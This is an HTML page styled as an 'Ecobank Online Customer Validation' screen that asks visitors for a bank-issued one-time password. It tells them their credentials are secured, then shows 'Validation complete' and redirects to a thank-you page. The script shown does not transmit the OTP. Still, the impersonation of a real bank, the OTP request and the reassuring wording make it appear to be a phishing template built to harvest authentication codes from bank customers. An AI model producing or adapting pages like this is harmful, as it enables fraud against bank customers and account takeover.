<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Validation OTP</title>

  <style>
    * {
      box-sizing: border-box;
    }

    html,
    body {
      width: 100%;
      min-height: 100%;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f5f8fc;
      color: #333;
      text-align: center;
      overflow-x: hidden;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .header {
      width: 100%;
      background-color: #0A3D91;
      padding: 40px 20px 20px;
      color: #ffffff;
      text-transform: uppercase;
      font-weight: 700;
      font-size: clamp(18px, 5vw, 22px);
      line-height: 1.3;
    }

    .subtext {
      color: #ffffff;
      font-size: clamp(12px, 3.5vw, 14px);
      margin-top: 8px;
      font-weight: 400;
      text-transform: none;
      line-height: 1.5;
    }

    .container {
      width: calc(100% - 32px);
      max-width: 360px;
      background: #ffffff;
      border-radius: 16px;
      margin: 40px auto;
      padding: 30px 25px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
    }

    form {
      width: 100%;
    }

    label {
      display: block;
      width: 100%;
      text-align: left;
      margin-bottom: 8px;
      color: #333;
      font-weight: 600;
      font-size: 15px;
    }

    input[type="text"] {
      display: block;
      width: 100%;
      max-width: 100%;
      padding: 12px;
      border: 1px solid #cfd8e3;
      border-radius: 8px;
      font-size: 16px;
      margin-bottom: 20px;
      color: #0A3D91;
      background-color: #ffffff;
      box-sizing: border-box;
      outline: none;
    }

    input[type="text"]:focus {
      border-color: #0A3D91;
      box-shadow: 0 0 0 3px rgba(10, 61, 145, 0.12);
    }

    button {
      display: block;
      width: 100%;
      min-height: 48px;
      background-color: #168a3a;
      border: none;
      color: #ffffff;
      font-weight: 700;
      border-radius: 30px;
      padding: 12px 20px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #116d2e;
    }

    button:active {
      transform: scale(0.99);
    }

    .notice {
      font-size: 13px;
      color: #777;
      text-align: center;
      margin-top: 15px;
      line-height: 1.5;
      word-wrap: break-word;
    }

    .footer {
      width: 100%;
      margin-top: auto;
      background-color: #0A3D91;
      color: #ffffff;
      padding: 18px 20px;
      font-size: 14px;
      font-weight: 600;
      text-align: center;
    }

    /* Small phones */
    @media (max-width: 380px) {
      .header {
        padding: 30px 15px 18px;
      }

      .container {
        width: calc(100% - 24px);
        margin: 25px auto;
        padding: 24px 18px;
        border-radius: 14px;
      }

      input[type="text"] {
        font-size: 16px;
        padding: 12px 10px;
      }

      button {
        font-size: 15px;
      }

      .footer {
        font-size: 13px;
        padding: 16px 12px;
      }
    }

    /* Very small screens */
    @media (max-width: 320px) {
      .header {
        font-size: 17px;
      }

      .subtext {
        font-size: 12px;
      }

      .container {
        width: calc(100% - 20px);
        padding: 20px 14px;
      }

      .footer {
        font-size: 12px;
      }
    }

    /* Larger screens */
    @media (min-width: 768px) {
      .container {
        margin-top: 50px;
      }
    }
  </style>
</head>

<body>

  <div class="header">
    ECOBANK ONLINE CUSTOMER VALIDATION

    <div class="subtext">
      Validation of your Ecobank Account is in progress
    </div>
  </div>

  <div class="container">

    <form id="otpForm">

      <label for="otp">
        Validation OTP
      </label>

      <input
        type="text"
        id="otp"
        name="validation_otp"
        placeholder="Enter OTP recieved from the bank"
        required
      >

      <button type="submit">
        Validate OTP →
      </button>

      <div class="notice" id="status">
        Your credentials are secured.
      </div>

    </form>

  </div>

  <footer class="footer">
    A Better Way To Bank Your Way
  </footer>
  <div class="subtext">
      Ecobank, The Pan African Bank
    </div>
  </div>

  <script>
    const form = document.getElementById("otpForm");
    const statusEl = document.getElementById("status");

    form.addEventListener("submit", (e) => {
      e.preventDefault();

      statusEl.textContent = "Validation complete ✔️";
      statusEl.style.color = "#168a3a";

      setTimeout(() => {
        window.location.href = "thankyou.html";
      }, 700);
    });
  </script>

</body>
</html>
